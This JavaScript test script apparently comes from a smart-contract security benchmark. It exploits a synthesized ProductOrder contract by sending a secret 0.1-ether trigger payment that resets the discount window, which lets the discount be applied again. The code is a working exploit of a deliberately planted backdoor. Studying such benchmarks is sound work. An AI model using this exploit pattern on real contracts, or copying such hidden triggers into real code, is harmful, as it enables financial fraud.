require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
const { sleep } = require('@lib/os/process');
let logger = require('@lib/logging/logger');



const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
let contractFileFullName = 'ProductOrder-8.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');

async function exploit(web3, envInfo, contractAddress) {
    try {   
        let solcVersion = extractSolcVersion(source);
        let { abi } = await compileWithVersion(source, contractFileFullName, 'ProductOrder', solcVersion);
        
        let contractInstance = new web3.eth.Contract(abi, contractAddress);

        // First, apply the discount as usual
        let step1Receipt = await contractInstance.methods.applyDiscount().send({
            from: web3.eth.accounts.wallet[0].address,
            gas: 3000000
        });

        console.log("Initial discount applied.");

        await sleep(4000);

        // Then, pay the secret trigger amount to reset discountEndTime
        let triggerAmount = web3.utils.toWei('0.1', 'ether');
        let step2Receipt = await contractInstance.methods.payForOrder().send({
            from: web3.eth.accounts.wallet[0].address,
            value: triggerAmount,
            gas: 3000000
        });

        if (step2Receipt.status) {
            console.log("Secret payment made, discount time extended.");
            await sleep(3000);

            // Reapply the discount
            let step3Receipt = await contractInstance.methods.applyDiscount().send({
                from: web3.eth.accounts.wallet[0].address,
                gas: 3000000
            });

            if (step3Receipt.status) {
                console.log("Discount reapplied successfully.");
                return true;
            } else {
                console.error("Failed to reapply discount.");
                return false;
            }
        } else {
            console.error("Secret payment failed!");
            return false;
        }
    } catch (error) {
        console.error(error.stack);
        return false;
    }
}


module.exports = async function runTests(web3, envInfo, contractAddress) {
    let result = await exploit(web3, envInfo, contractAddress);
    console.log(chalk.blue(`Result of running the exploit is: ${result}`));
    return result; 
}
